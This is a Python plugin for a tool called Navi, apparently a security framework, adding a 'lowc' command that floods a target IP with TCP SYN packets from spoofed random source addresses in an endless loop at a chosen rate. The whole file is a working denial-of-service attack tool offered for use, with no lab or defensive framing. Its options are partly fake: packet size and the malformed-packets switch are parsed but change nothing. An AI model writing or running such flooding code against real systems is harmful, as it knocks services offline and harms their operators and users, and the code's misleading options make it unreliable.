import navi_internal
from scapy.all import *

# Chip documentation: https://github.com/SaintsSec/Navi/wiki/4.-Developing-Chips-%E2%80%90-Indepth


command: str = "lowc"
use: str = "Perform a Distributed Denial-of-Service (DDoS) attack on a target IP address"
aliases: list = ['lowc']
params: dict = {
    '-help': 'Display help information',
    '-h': 'Display help information',
    '-target': 'The target IP address to attack',
    '-packet_size': 'The size of the packets to send (in bytes)',
    '-packets_per_second': 'The number of packets to send per second',
    '-malformed_packets': 'Whether to send malformed packets (True/False)'
}

help_params: tuple = ('-help', '-h')

def print_params() -> None:
    # Print the header
    print(f"{'Parameter':<20} | {'Description'}")
    print("-" * 50)
    # Print each dictionary item
    for param, description in params.items():
        print(f"{param:<20} | {description}")

# What Navi calls to run this Chip
def run(arguments=None) -> None:
    # Get the instance of Navi. Required to access Navi-specific functions
    navi_instance = navi_internal.navi_instance
    # Optional: Converts argument tokens into a list
    arg_array = arguments.text.split()
    # Remove the command itself
    arg_array.pop(0)
    # Initialize variables
    target_ip = None
    packet_size = 1000
    packets_per_second = 5000
    malformed_packets = False
    # Optional: Check for parameters
    if arg_array is not None:
        for i in range(0, len(arg_array), 2):
            param = arg_array[i]
            value = arg_array[i + 1]
            match param:
                case '-help' | '-h':
                    print_params()
                    return
                case '-target':
                    target_ip = value
                case '-packet_size':
                    packet_size = int(value)
                case '-packets_per_second':
                    packets_per_second = float(value)
                case '-malformed_packets':
                    malformed_packets = value.lower() == 'true'
                case _:
                    navi_instance.print_message(f"Invalid parameter: {param}")
                    return

    # Check if target IP is provided
    if target_ip is None:
        navi_instance.print_message("Please provide a target IP address using the -target parameter")
        return
    # Perform the DDoS attack
    perform_ddos(target_ip, packet_size, packets_per_second, malformed_packets)

def perform_ddos(target_ip, packet_size, packets_per_second, malformed_packets):
    # Create a packet with the specified packet size
    packet = IP(src=RandIP(), dst=target_ip) / TCP(sport=RandShort(), dport=80, flags="S")
    packet.show()
    # Send the packet repeatedly at the specified rate
    if malformed_packets:
        # Send malformed packets
        send(packet, loop=1, count=None, inter=1/packets_per_second)
    else:
        # Send normal packets
        send(packet, loop=1, count=None, inter=1/packets_per_second)

# Entry point for the script
if __name__ == '__main__':
    run()